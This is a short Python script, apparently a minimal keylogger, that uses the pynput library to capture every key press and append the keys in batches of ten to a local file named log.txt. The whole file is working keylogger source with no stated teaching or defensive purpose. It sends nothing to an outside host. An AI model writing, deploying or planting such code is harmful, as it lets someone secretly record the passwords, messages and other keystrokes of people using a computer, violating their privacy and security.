from pynput.keyboard import Key, Listener

threshhold = 10
count = 0
keys = []


def on_key_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= threshhold:
        count = 0
        submit_keys(keys)
        keys = []

def on_key_release(key):
    pass


def submit_keys(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key))





with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()